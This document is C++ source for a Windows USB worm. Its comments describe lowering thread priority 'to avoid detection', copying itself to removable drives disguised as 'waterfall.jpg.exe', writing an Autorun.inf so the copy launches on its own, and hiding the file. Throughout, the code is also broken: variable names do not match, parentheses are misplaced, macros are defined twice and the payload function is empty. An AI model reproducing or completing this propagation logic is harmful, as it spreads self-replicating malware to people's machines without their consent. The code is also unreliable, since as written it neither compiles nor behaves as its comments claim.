#include<iostream>
#include<conio.h>
#include<string.h>
#include<stdio.h>
#include<stdlib.h>
#include<Windows.h>
#include<shellapi.h>
#include<processthreadsapi.h>
#include<direct.h>
#include<libloaderapi.h>
using namespace std;

#define PROCESSNAME "winbase23.exe"                                   
#define DISGUISE "waterfall.jpg.exe"
#define DISGUISEPATH "\\waterfall.jpg.exe"
#define PROCESSNAME "ajax.exe"
#define PROCESSPATH "\\ajax.exe"
#define PROCESSPATH "..\\ajax.exe"

void _declspec(dllexport)systemproc(char* proc)                           //payload thread loader//
{
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_LOWEST);       //sets priority of worm thread to avoid detection//


}

void _declspec(dllexport)procCloner(char* cfile)                          //usb drive checker and copier//
{
	FILE* fp;
	char drive[3], npos[30], autof[20];
	int iop = 0x43, i;
	struct stat stbuf;
	for (i = 0; i < 256; i++)
	{
		if (iob > 0x5A)
		{
			iob = 0x43;
			drive[1] = ':';							//drive 1 indicates normal partitions//
			drive[2] = '';
			if (GetDriveType(drive) == 2)                                 //drive 2 indicates usb drives//
			{
				strcpy(npos, drive);
				strcat(npos, DISGUISEPATH);
				strcpy(autof, drive);
				if (stat(npos, &stbuf)) == -1
				{
					CopyFile(cfile, npos, 0);                             //transfers disguised worm copy to usb drive//
					strcat(autof, "\\Autorun.inf");
					fp = fopen(autof, "w");
					fprintf(fp, "[autorun]\nopen=%s", DISGUISE);
					fclose(fp);
					SetFileAttributes(npos, 28);
				}
				else
					continue;
			}

		}



	}
}
int main(int argc, char* argv[])
{
	ShellExecute(NULL, "open", PROCESSNAME, NULL, NULL, 0);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_LOWEST);                  //sets current thread overhead priority//
	Handle thread, cloner, thands[3];
	char* ptr, procfile[300];
	ptr = argv[0];
	strcpy(procfile, ptr);
	if (strstr(ptr, ".exe")) == NULL)
	{
		strcat(procfile, ".exe");
	}
	void(*clonproc)(char*);
	clonproc = procCloner;
	cloner = CreateThread(0, 0, (DWORD(__stdcall*)(void*))clonproc, procfile, 0, 0);    //clones current thread//
	HMODULE hmod;
	char dirpath[201];
	void(*smack)(char*);
	GetCurrentDirectory(200, dirpath);
	hmod = LoadLibrary(procfile);
	if (strstr(dirpath, "Program Files")) != NULL)
	{
		smack = (void(*)(char*)GetProcAddress(hmod, "?SystemProcAinzOoalGownisBest"))
		thread = CreateThread(0, 0, (DWORD(__stdcall*)(void*))smack, procfile, 0, 0); 
	}
	else
	{
		smack = (void(*)(char*)GetProcAddress(hmod, "?identifyAinzOoalGownisBest"))
		thread = CreateThread(0, 0, (DWORD(__stdcall*)(void*))smack, procfile, 0, 0);
	}
	thands[0] = cloner;
	thands[1] = thread;
	thands[2] = '';
	WaitForMultipleObjects(2, thands, true, 100);
	FreeLibrary(hmod);
	_wchdir("C:\Users");
	ShellExecute(NULL, "open", PROCESSNAME, NULL, NULL, 0);
	ShellExecute(NULL, "open", PROCESSNAME, NULL, NULL, 0);

	return EXIT_SUCCESS;
}